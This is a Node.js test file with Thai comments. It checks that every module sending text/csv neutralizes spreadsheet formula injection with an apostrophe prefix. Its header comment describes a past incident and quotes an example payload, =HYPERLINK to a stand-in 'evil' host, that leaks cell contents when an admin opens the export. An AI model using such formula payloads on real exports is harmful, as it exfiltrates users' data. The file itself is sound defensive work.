// tools/test/csv-formula-guard.test.mjs
//
// ── ด่านกัน CSV formula injection (CWE-1236) ─────────────────────────────────
//
// เคสจริง 17/11/69 (SEC-057): `GET /api/health/export?format=csv` escape
// เครื่องหมายคำพูดครบ แต่ไม่เคย neutralize เซลล์ที่ขึ้นต้นด้วย `=` `+` `-` `@`
// ⇒ `detail` จาก `POST /api/health/observations` (ผู้ใช้บันทึกได้) กลายเป็น
// "สูตร" เมื่อผู้ดูแลเปิดไฟล์ใน Excel/Google Sheets: `=HYPERLINK("http://evil/?"&A1)`
// หรือ `=WEBSERVICE(...)` (รุ่นเก่ายิง request ออกทันทีที่เปิดไฟล์)
//
// `audit.routes.ts` ทำถูกอยู่แล้ว (`csvCell`) — health ตกหล่นเพราะเขียนเองแยก
// ⇒ ด่านนี้บังคับว่า **ทุกไฟล์ที่ส่ง `text/csv` ต้องมีตัว neutralize สูตรในไฟล์นั้น**
// (จะใช้ helper ร่วมหรือเขียนเองก็ได้ แต่ต้องมีจริง)
//
// ของที่ด่านนี้จับไม่ได้: ไฟล์ที่ประกอบ CSV แล้วให้คนอื่นส่ง header
// (เช่น push ผ่าน service) — แต่ทั้งระบบมีผู้ส่ง `text/csv` แค่ 2 จุดนี้
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '..', '..');
const SRC = path.join(ROOT, 'sovereign-os', 'core-api', 'src');

/** ไฟล์ที่ยกเว้น — ต้องมีเหตุผลว่า "ทำไมสูตรในเซลล์ไม่เป็นอันตราย" */
const EXEMPT = new Map();

function walk(dir, out = []) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) walk(full, out);
    else if (entry.name.endsWith('.ts')) out.push(full);
  }
  return out;
}

/** นิพจน์ที่ใช้ตรวจ "อักขระที่เริ่มสูตรได้" (รับหลายสำนวน แต่ต้องเริ่มด้วย char class นี้) */
function hasFormulaGuard(text) {
  return /\/\^\[=\+\\-@\\t\\r\]\//.test(text);
}

/** ต้องมีการเติม apostrophe นำหน้า (โหมดข้อความของ Excel) ไม่ใช่แค่ตรวจแล้วทิ้ง */
function hasApostrophePrefix(text) {
  return /`'\$\{/.test(text) || /'\s*\+\s*(text|value|cell|String)/.test(text);
}

test('ทุกไฟล์ที่ส่ง text/csv ต้องมีตัว neutralize สูตร (formula injection)', () => {
  const files = walk(SRC).filter((f) => /text\/csv/.test(fs.readFileSync(f, 'utf8')));
  assert.ok(files.length > 0, 'ต้องเจอไฟล์ที่ส่ง text/csv อย่างน้อย 1 ไฟล์ — ถ้าไม่เจอแปลว่า scanner พัง');

  const problems = [];
  for (const file of files) {
    const rel = path.relative(SRC, file).replace(/\\/g, '/');
    if (EXEMPT.has(rel)) continue;
    const text = fs.readFileSync(file, 'utf8');
    if (!hasFormulaGuard(text)) {
      problems.push(`${rel} — ไม่พบการตรวจอักขระเริ่มสูตร (/^[=+\\-@\\t\\r]/)`);
      continue;
    }
    if (!hasApostrophePrefix(text)) {
      problems.push(`${rel} — ตรวจสูตรแล้วแต่ไม่ได้เติม apostrophe ให้กลายเป็นข้อความ`);
    }
  }

  assert.deepEqual(
    problems,
    [],
    'CSV ที่มีเซลล์จากผู้ใช้ต้อง neutralize สูตร (= + - @) ก่อนส่งออก ไม่งั้นเปิดใน Excel ' +
      'แล้ว fórmula ทำงาน (CWE-1236):\n' +
      problems.join('\n')
  );
});

test('รายการยกเว้นต้องไม่ค้าง — ไฟล์ที่ยกเว้นต้องยังส่ง text/csv จริง', () => {
  const withCsv = new Set(
    walk(SRC)
      .filter((f) => /text\/csv/.test(fs.readFileSync(f, 'utf8')))
      .map((f) => path.relative(SRC, f).replace(/\\/g, '/'))
  );
  const stale = [...EXEMPT.keys()].filter((rel) => !withCsv.has(rel));
  assert.deepEqual(stale, [], 'EXEMPT อ้างไฟล์ที่ไม่ได้ส่ง text/csv แล้ว — ลบออกเพื่อไม่ให้ด่านตาบอด');
});

test('ตัว neutralize ต้องถูกใช้กับคอลัมน์ข้อความ (ไม่ใช่ประกาศทิ้งไว้)', () => {
  const health = fs.readFileSync(path.join(SRC, 'modules', 'health', 'health.routes.ts'), 'utf8');
  assert.match(health, /csvCell\(o\.source\)/, 'source ต้องผ่าน csvCell');
  assert.match(health, /csvCell\(o\.detail\)/, 'detail ต้องผ่าน csvCell');
});
